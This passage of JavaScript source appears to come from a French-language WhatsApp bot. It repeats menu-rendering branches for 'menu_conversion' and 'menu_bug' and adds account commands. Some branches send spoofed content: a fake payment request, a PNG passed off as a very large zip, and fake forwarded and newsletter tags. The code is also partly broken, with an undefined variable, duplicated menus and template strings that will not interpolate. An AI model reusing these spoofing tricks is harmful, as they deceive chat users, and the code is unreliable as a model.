                } else if (typemenu === 'c7') {
                    Kev.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: kmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KenvFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'c8') {
                	Kev.sendMessage(m.chat, {
      video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
      gifPlayback: true,
      caption: kmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://telegra.ph/file/5d30d0fd8bfb65d90a3f1.jpg',
      sourceUrl: '',
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'c9') {
                	Kev.sendMessage(m.chat, {
video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
caption: kmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://telegra.ph/file/5d30d0fd8bfb65d90a3f1.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'c10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: kmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": '{"display_text":"tout_menu 🗂️","id":"${prefix}toutmenu"}'
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Proprio 👤","id":"${prefix}proprio"}'
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Script 📃","id":"${prefix}script"}'
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'c11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: kmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": '{"display_text":"tout_menu 🗂️","id":"${prefix}toutmenu"}'
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Proprio 👤","id":"${prefix}proprio"}'
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Script 📃","id":"${prefix}script"}'
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await Kev.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'c12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: kmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
'{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"TOUT MENU",
"title":"cliquez pour afficher",
"description":"Afficher toutes les commandes",
"id":"${prefix}tout_menu"}]
}]
}'
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Proprio 👤","id":"${prefix}proprio"}'
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Script 📃","id":"${prefix}script"}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'menu_conversion': {
let kmenu_oh = 'Hey ${pushname}${readmore}\n\n${nsfwmenu(prefix, hituet)}'
if (typemenu === 'c1') {
                    Kev.sendMessage(m.chat, {
                        image: fs.readFileSync('./KenvFile/theme/sylvers.jpg'),
                        caption: kmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'c2') {
                    Kev.sendMessage(m.chat, {
                        text: kmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KenvFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'c3') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
                        caption: kmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'c4') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
                        caption: kmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'c5') {
                    Kev.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: kmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'c6') {
                    Kev.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'c7') {
                    Kev.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: kmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KenvFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'c8') {
                	Kev.sendMessage(m.chat, {
      video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
      gifPlayback: true,
      caption: kmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://telegra.ph/file/5d30d0fd8bfb65d90a3f1.jpg',
      sourceUrl: '',
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'c9') {
                	Kev.sendMessage(m.chat, {
video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
caption: kmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://telegra.ph/file/5d30d0fd8bfb65d90a3f1.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'c10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: kmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": '{"display_text":"tout_menu 🗂️","id":"${prefix}toutmenu"}'
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Proprio 👤","id":"${prefix}proprio"}'
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Script 📃","id":"${prefix}script"}'
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'c11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: kmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": '{"display_text":"tout_menu 🗂️","id":"${prefix}toutmenu"}'
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Proprio 👤","id":"${prefix}proprio"}'
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Script 📃","id":"${prefix}script"}'
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await Kev.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'c12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: kmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
'{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"TOUT MENU",
"title":"cliquez pour afficher",
"description":"Afficher toutes les commandes",
"id":"${prefix}tout_menu"}]
}]
}'
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Proprio 👤","id":"${prefix}proprio"}'
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Script 📃","id":"${prefix}script"}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'menu_bug': {
let kmenu_oh = 'Hey ${pushname}${readmore}\n\n${nsfwmenu(prefix, hituet)}'
if (typemenu === 'c1') {
                    Kev.sendMessage(m.chat, {
                        image: fs.readFileSync('./KenvFile/theme/sylvers.jpg'),
                        caption: kmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'c2') {
                    Kev.sendMessage(m.chat, {
                        text: kmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KenvFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'c3') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
                        caption: kmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'c4') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
                        caption: kmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'c5') {
                    Kev.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: kmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'c6') {
                    Kev.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'c7') {
                    Kev.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: kmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KenvFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'c8') {
                	Kev.sendMessage(m.chat, {
      video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
      gifPlayback: true,
      caption: kmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://telegra.ph/file/5d30d0fd8bfb65d90a3f1.jpg',
      sourceUrl: '',
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'c9') {
                	Kev.sendMessage(m.chat, {
video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
caption: kmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://telegra.ph/file/5d30d0fd8bfb65d90a3f1.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'c10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: kmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": '{"display_text":"tout_menu 🗂️","id":"${prefix}toutmenu"}'
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Proprio 👤","id":"${prefix}proprio"}'
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Script 📃","id":"${prefix}script"}'
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'c11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: kmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": '{"display_text":"tout_menu 🗂️","id":"${prefix}toutmenu"}'
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Proprio 👤","id":"${prefix}proprio"}'
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Script 📃","id":"${prefix}script"}'
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await Kev.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'c12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: kmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
'{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"TOUT MENU",
"title":"cliquez pour afficher",
"description":"Afficher toutes les commandes",
"id":"${prefix}tout_menu"}]
}]
}'
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Proprio 👤","id":"${prefix}proprio"}'
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Script 📃","id":"${prefix}script"}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
            case 'detail_compte':
            case 'compte': {
               let a = db.data.users[sender]
               let b = 'les infos du comptes sont les suivantes\n'
               b += '================================\n'
               b += 'Code:\n*[${a.serialNumber}]*\n'
               b += 'Titre: ${a.title}\n'
               b += 'Afk : ${a.afkTime}\n'
               b += 'Raison Afk : ${a.afkReason}\n' 
               b += 'Pseudo: ${a.nick}\n'
               b += 'Statut Boss: ${a.premium}\n'
               b += 'Votre Limite: ${a.limit}\n'
               b += '================================'
               Kev.sendMessage(sender, { text: b }, { quoted: m })
               replygckev('Les details du compte ont ete send dans votre dm')
            }
            break
            case 'limite':
            case 'voir_limite': {
               let a = db.data.users[sender]
               let b = 'Votre Limite ${a.limit}\n' 
               b += 'Statut Boss ${isPremium ? 'On' : 'Off' }\n' 
